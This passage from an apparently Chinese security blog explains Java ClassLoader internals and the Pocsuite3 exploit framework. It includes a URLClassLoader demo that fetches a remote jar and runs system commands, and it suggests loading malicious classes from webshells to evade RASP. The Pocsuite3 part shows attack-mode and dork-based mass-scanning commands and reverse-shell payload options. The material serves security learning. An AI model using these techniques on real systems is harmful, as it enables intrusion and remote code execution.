<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader loader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        System.out.println(loader.getParent());</span><br><span class="line">             System.out.println(loader.getParent().getParent());</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130163705818.png" class title="image-20211130163705818">





<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>java.lang.ClassLoader是所有的类加载器的父类，所以ClassLoader有许多子类加载器。比如下方的URLClassLoader类加载器，重写了findClass()方法实现加载目录Class文件甚至是加载远程文件造成命令执行等</p>
<p>我们可以自定义类加载器实现加载自定义的字节码(加载恶意文件)触发恶意代码执行。</p>
<p>下面以helloworld.java举例说明:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloworld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该类编译并查看其字节码</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201121810882.png" class title="image-20211201121810882">



<p>一个类可以被JVM内置类加载器加载的前提是存在于classpath中，否则就需要我们自定义类加载器继承ClassLoade类重写findclass方法，传入所需加载类的字节码来向JVM定义一个类，最后通过反射机制调用该类执行代码。</p>
<p>自定义TestClassLoader类:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">&quot;Classloader_test.Helloworld&quot;</span>;</span><br><span class="line">        <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] testClassBytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/Administrator/Desktop/Helloworld.class&quot;</span>));<span class="comment">//加载字节码文件</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestClassLoader</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">        <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> TestClassLoader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">        Class testClass = loader.loadClass(testClassName);</span><br><span class="line">        <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">        Object testInstance = testClass.newInstance();</span><br><span class="line">        <span class="comment">// 反射获取hello方法</span></span><br><span class="line">        Method method = testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">        String str = (String) method.invoke(testInstance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201134716275.png" class title="image-20211201134716275">



<p>总结:</p>
<p>根据上方自定义类加载helloworld类调用hello方法来看，我们可以延申一下攻击思路。我们可以在webshell中 实现加载并调用自己编译的类对象(恶意类)来执行恶意操作，比如本地命令执行等。在这一过程中调用自定义类字节码的native方法绕过RASP检测，我们也可以通过一些弱加密来加密java字节码。</p>
<h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>上面提到的所有类加载器都必须继承java.lang.ClassLoader类。</p>
<p>它的主要方法可以分为5种:</p>
<ul>
<li>loadClass (加载指定的java类)</li>
<li>findClass (查找指定的java类 )</li>
<li>findloadedClass (查看JVM加载过的类)</li>
<li>defineClass (定义一个java类)</li>
<li>resolveClass (链接指定的java类)</li>
</ul>
<h3 id="LoadClass"><a href="#LoadClass" class="headerlink" title="LoadClass"></a>LoadClass</h3><p>在ClassLoader类中存在一个loadClass方法，该代码就是双亲委派的实现。</p>
<p>当父类加载器加载不到类时，会调用findClass方法查找类，使用本身的类加载器进行加载类.</p>
<p>代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">       <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">           <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">           Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">           <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                       c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       c = findBootstrapClassOrNull(name);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                   <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                   <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                   <span class="comment">// to find the class.</span></span><br><span class="line">                   <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                   c = findClass(name);</span><br><span class="line"></span><br><span class="line">                   <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                   sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">               resolveClass(c);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>





<h3 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h3><p>在自定义类加载器时，一般会覆盖掉这个方法， 当覆盖掉这个类时程序会调用我们写的类。</p>
<p>代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>该方法将字节解析成虚拟机能够识别的Class对象。通常来说，defineClass()方法与findClass()一起使用。</p>
<p>代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">       <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h3 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h3><p>连接指定的类，类加载器可以使用此方法来连接类</p>
<h2 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a>ClassLoader类加载流程</h2><p>这里简单写个java程序，代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloworld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world!!!!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>加载流程；</p>
<ul>
<li>ClassLoader调用loadClass()方法加载helloworldle类，调用findloadedClass方法检查helloworld类是否已经初始化，如果JVM初始化过该类就直接返回类对象。</li>
<li>如果当前类加载器传入父类加载器加载类加载类失败，就调用自身的findClass方法尝试加载helloworld类</li>
<li>如果当前类加载器重写了findClass方法并通过传入的类名找到了类字节码，调用defineClass方法在JVM中注册该类。否则返回类加载失败异常。</li>
<li>如果调用loaderClass的时候传入的resolve参数为true,还需要调用resolveClass方法链接类，默认为false.</li>
<li>返回一个被JVM加载后的java.lang.Class对象</li>
</ul>
<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>在java.net包中，JDK提供了一个易用的继承了ClassLoader的类加载器URLClassLoader类。</p>
<p>URLClassLoader提供了加载远程资源的能力，在一些远程利用接口下可以调用该类来加载jar实现RCE。</p>
<p>构造方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls)</span> </span></span><br><span class="line"><span class="function"><span class="comment">//指定要加载的类所在的URL地址，父类加载器默认为系统类加载器。</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent)</span></span></span><br><span class="line"><span class="function"><span class="comment">//指定要加载的类所在的URL地址，并指定父类加载器。</span></span></span><br></pre></td></tr></table></figure>



<p>Demo代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestURLClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://javaweb.org/tools/cmd.jar&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            String cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            Class cmdClass = ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="keyword">null</span>, cmd);</span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            InputStream           in   = process.getInputStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[]                b    = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span>                   a    = -<span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>加载的jar文件源代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line">publicclass CMD &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将该代码编译后打包成jar包放在本机服务器上。</p>
<p>代码运行如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">README.md</span><br><span class="line">gitbook</span><br><span class="line">javaweb-sec-source</span><br><span class="line">javaweb-sec.iml</span><br><span class="line">jni</span><br><span class="line">pom.xml</span><br></pre></td></tr></table></figure>





<h2 id="类动态加载方式"><a href="#类动态加载方式" class="headerlink" title="类动态加载方式"></a>类动态加载方式</h2><p>Java类加载方式分为显式和隐式。</p>
<p>显式就是我们通常使用的Java反射和ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new 类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。</p>
<p>常用类动态加载方式:</p>
<ul>
<li>Class.forName(“类名“)      默认初始化被加载类的静态属性和方法</li>
<li>Class.forName(“类名 “,是否初始化类，类加载器)      不初始化类</li>
<li>Class.loadClass  默认不会初始化方法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//反射加载helloworld示例:</span><br><span class="line">Class.forName(&quot;com.Classloader.helloWorld&quot;);</span><br><span class="line"></span><br><span class="line">//ClassLoader加载helloworld示例；</span><br><span class="line">this.getClass().getClassLoader().loadClass(&quot;com.Classloader.helloWorld&quot;);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-Java基础 -ClassLoader类加载 -代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Pocsuite使用及Poc编写</title>
    <url>/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="Pocsuite-使用及Poc编写"><a href="#Pocsuite-使用及Poc编写" class="headerlink" title="Pocsuite 使用及Poc编写"></a>Pocsuite 使用及Poc编写</h1><hr>
<h2 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h2><p>PocSuite是由知道创宇 404 实验室编写的一款基于 python 的开源漏洞利用框架。PocSuite 包含漏洞检测和利用两种模式，可以针对特定漏洞对多个目标进行探测并返回漏洞检测及利用的结果。</p>
<p>下载地址: <a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a></p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207143045516.png" class title="image-20220207143045516">



<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>Pocsuite的使用可以通过两种方式进行，一种是直接在输入命令时指定poc文件和线程数量进行探测，另外一种是设置pocsuite.ini文件命令行默认运行。</p>
<h3 id="指定文件探测"><a href="#指定文件探测" class="headerlink" title="指定文件探测"></a>指定文件探测</h3><p>举例: 使用ZoomEye搜索ecshop并使用ecshop_rce.py探测，指定线程数量为5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cli.py --r pocs/ecshop_rce.py --dork ecshop  --threads 5</span><br><span class="line"></span><br><span class="line">#--r            指定需要使用的poc文件</span><br><span class="line">#--dork         指定搜索引擎搜索的内容(Zoomeye,shodan......)</span><br><span class="line">#--max-page     ZoomEye API 的请求翻页数（10 目标/页）</span><br><span class="line">#--search-type  ZoomEye API搜索类型，web 或者 host</span><br><span class="line">#--vul-keyword  Seebug 搜索关键词，用于在Seebug 搜索漏洞POC</span><br><span class="line">#--threads      指定线程数量</span><br></pre></td></tr></table></figure>

<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207150558967.png" class title="image-20220207150558967">



<p><strong>verify模式</strong></p>
<p>验证目标是否存在漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单个目标验证：</span><br><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --verify</span><br><span class="line"></span><br><span class="line">批量文件验证:</span><br><span class="line">pocsuite -r test/poc_example.py -f url.txt --verify</span><br><span class="line"></span><br><span class="line">扫描器（使用目录下的所有Poc对目标进行测试）:</span><br><span class="line">pocsuite -r tests/ -u http://www.example.com --verify</span><br></pre></td></tr></table></figure>





<p><strong>attack模式</strong></p>
<p>向存在漏洞的目标进行漏洞利用攻击。(用法和verify模式相同)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --attack</span><br></pre></td></tr></table></figure>





<h3 id="配置文件默认探测"><a href="#配置文件默认探测" class="headerlink" title="配置文件默认探测"></a>配置文件默认探测</h3><p>设置pocsuite.ini配置文件，命令行指定配置文件探测</p>
<h4 id="【Target】"><a href="#【Target】" class="headerlink" title="【Target】"></a>【Target】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Target]</span><br><span class="line">; target url (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)  </span><br><span class="line">url =                   ###指定探测的URL目标###</span><br><span class="line"></span><br><span class="line">; scan multiple targets given in a textual file</span><br><span class="line">url_file =              ###指定探测的URL目标文件###</span><br><span class="line"></span><br><span class="line">; load poc file from local or remote from seebug website</span><br><span class="line">poc = ecshop_rce.py     ###指定的POC文件###  </span><br><span class="line"></span><br><span class="line">; filter poc by keyword, e.g. cve-2021-22005</span><br><span class="line">poc_keyword =           ###指定的POC文件密码###</span><br></pre></td></tr></table></figure>



<h4 id="【Request】"><a href="#【Request】" class="headerlink" title="【Request】"></a>【Request】</h4><p>设置请求头部，针对某些需要登录的目标地址或自主设置HTTP请求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Request]</span><br><span class="line">; http cookie header value</span><br><span class="line">cookie = </span><br><span class="line">; http host header value</span><br><span class="line">host = </span><br><span class="line">; http referer header value</span><br><span class="line">referer = </span><br><span class="line">; http user-agent header value (default random)</span><br><span class="line">agent = </span><br><span class="line">; use a proxy to connect to the target url</span><br><span class="line">proxy = </span><br><span class="line">; proxy authentication credentials (name:password)</span><br><span class="line">proxy_cred = </span><br><span class="line">; seconds to wait before timeout connection (default 30)</span><br><span class="line">timeout = </span><br><span class="line">; time out retrials times</span><br><span class="line">retry =</span><br><span class="line">; delay between two request of one thread</span><br><span class="line">delay = </span><br><span class="line">; extra headers (e.g. &quot;key1: value1\nkey2: value2&quot;)</span><br><span class="line">headers = </span><br></pre></td></tr></table></figure>



<h4 id="【Mode】"><a href="#【Mode】" class="headerlink" title="【Mode】"></a>【Mode】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Mode]</span><br><span class="line">; run poc with verify mode</span><br><span class="line">; run poc with attack mode</span><br><span class="line">; run poc with shell mode</span><br><span class="line">mode = verify</span><br><span class="line"></span><br><span class="line">####poc需要执行的模式分为exp和verify###</span><br></pre></td></tr></table></figure>



<h4 id="【Account】"><a href="#【Account】" class="headerlink" title="【Account】"></a>【Account】</h4><p>设置搜索引擎的账号密码或者Token进行登录请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Account]</span><br><span class="line">; telnet404 login user</span><br><span class="line">login_user =</span><br><span class="line">; telnet404 login password</span><br><span class="line">login_pass =</span><br><span class="line"></span><br><span class="line">; Shodan token</span><br><span class="line">shodan_token =</span><br><span class="line"></span><br><span class="line">; fofa user</span><br><span class="line">fofa_user =</span><br><span class="line">; fofa token</span><br><span class="line">fofa_token =</span><br><span class="line"></span><br><span class="line">; quake token</span><br><span class="line">quake_token =</span><br><span class="line"></span><br><span class="line">; Censys uid</span><br><span class="line">censys_uid =</span><br><span class="line">; Censys secret</span><br><span class="line">censys_secret =</span><br></pre></td></tr></table></figure>



<h4 id="【Modules】"><a href="#【Modules】" class="headerlink" title="【Modules】"></a>【Modules】</h4><p>指定使用的搜索引擎进行查询，dork用来设置Zoomeye等搜索引擎的搜索语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Modules]</span><br><span class="line">; zoomeye dork used for search</span><br><span class="line">dork =</span><br><span class="line">; zoomeye dork used for search</span><br><span class="line">dork_zoomeye =</span><br><span class="line">; shodan dork used for search</span><br><span class="line">dork_shodan =</span><br><span class="line">; censys dork used for search</span><br><span class="line">dork_censys =</span><br><span class="line">; fofa dork used for search</span><br><span class="line">dork_fofa =</span><br><span class="line">; quake dork used for search</span><br><span class="line">dork_quake =</span><br><span class="line">; max page used in search api</span><br><span class="line">max_page = 1</span><br><span class="line">; search type used in zoomeye api, web or host</span><br><span class="line">search_type = host</span><br><span class="line">; seebug keyword used for search</span><br><span class="line">vul_keyword =</span><br><span class="line">; seebug ssvid number for target poc</span><br><span class="line">ssvid =</span><br><span class="line">; connect back host for target poc in shell mode</span><br><span class="line">connect_back_host =</span><br><span class="line">; connect back port for target poc in shell mode</span><br><span class="line">connect_back_port =</span><br><span class="line">; enable TLS listener in shell mode</span><br><span class="line">enable_tls_listener = False</span><br><span class="line">; compare popular web search engines</span><br><span class="line">comparison = False</span><br><span class="line">; whether dork is in base64 format</span><br><span class="line">dork_b64 = False</span><br></pre></td></tr></table></figure>



<h4 id="【Optimization】"><a href="#【Optimization】" class="headerlink" title="【Optimization】"></a>【Optimization】</h4><p>设置可选选项参数，如线程等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Optimization]</span><br><span class="line">; load plugins to execute</span><br><span class="line">plugins =</span><br><span class="line">; user defined poc scripts path</span><br><span class="line">pocs_path =</span><br><span class="line">; max number of concurrent network requests (default 1)</span><br><span class="line">threads = 1</span><br><span class="line">; automatically choose defaut choice without asking</span><br><span class="line">batch = </span><br><span class="line">; check install_requires</span><br><span class="line">check_requires = False</span><br><span class="line">; activate quiet mode, working without logger</span><br><span class="line">quiet = False</span><br><span class="line">; hiden sensitive information when published to the network</span><br><span class="line">ppt = False</span><br><span class="line">; use scapy capture flow</span><br><span class="line">pcap = False</span><br><span class="line">; export suricata rules, default export request and response</span><br><span class="line">rule = False</span><br><span class="line">; only export suricata request rule</span><br><span class="line">rule_req = False</span><br><span class="line">; specify the name of the export rule file</span><br><span class="line">rule_filename =</span><br></pre></td></tr></table></figure>



<p>执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cli.py -c ../pocsuite.ini</span><br></pre></td></tr></table></figure>

<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207153115935.png" class title="image-20220207153115935">



<h2 id="插件工具"><a href="#插件工具" class="headerlink" title="插件工具"></a>插件工具</h2><p>通过–plugins在后面指定插件名称，多个插件可以用,分割。</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207153517654.png" class title="image-20220207153517654">



<p>例如</p>
<p>–plugins html_report将会生成HTML报表格式文档。</p>
<p>–plugins file_record将会生成HTML报表格式文档.</p>
<h2 id="Poc编写"><a href="#Poc编写" class="headerlink" title="Poc编写"></a>Poc编写</h2><p>这里以thinkphp_rce.py举例说明。</p>
<p>命名规则:PoC命名分成3个部分组成<strong>漏洞应用名_版本号__漏洞类型名称</strong> 文件名称中的所有字母改成小写.</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_34640691/article/details/109119942">(58条消息) 关于pocsuite下的pocs代码分析_willow_liang的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_45007073/article/details/113094045">(58条消息) POC和EXP脚本_平凡的学者的博客-CSDN博客_exp脚本</a></p>
<p><a href="https://blog.csdn.net/weixin_44426869/article/details/103962994">(58条消息) 使用Pocsuite3框架并编写简单PoC例子_情感博主V-CSDN博客_pocsuite3使用</a></p>
<h3 id="方法格式使用"><a href="#方法格式使用" class="headerlink" title="方法格式使用"></a>方法格式使用</h3><p>编写Poc主要分为Poc介绍信息模块，漏洞检测模块，漏洞利用模块，返回结果模块。</p>
<p>开头是对该Poc的简介，关于创建的时间、作者的名字，针对该Poc的漏洞信息和执行判断结果。</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207154854764.png" class title="image-20220207154854764">



<h4 id="def-options-self"><a href="#def-options-self" class="headerlink" title="def_options(self)"></a>def_options(self)</h4><p>该函数针对RCE类POC，需要执行相关命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _options(self):</span><br><span class="line">      o = OrderedDict()   ##实例化OrdereDict类对象o</span><br><span class="line">      payload = &#123;</span><br><span class="line">          ##调用REVERSE_PAYLOAD类的NC属性和BASH属性</span><br><span class="line">          &quot;nc&quot;: REVERSE_PAYLOAD.NC,</span><br><span class="line">          &quot;bash&quot;: REVERSE_PAYLOAD.BASH,</span><br><span class="line">      &#125;</span><br><span class="line">      o[&quot;command&quot;] = OptDict(selected=&quot;bash&quot;, default=payload)</span><br><span class="line">      ##调用OPtDict()函数将bash字符串传给o的command键值</span><br><span class="line">      </span><br><span class="line">      return o</span><br></pre></td></tr></table></figure>



<p>上述代码中涉及到的相关代码</p>
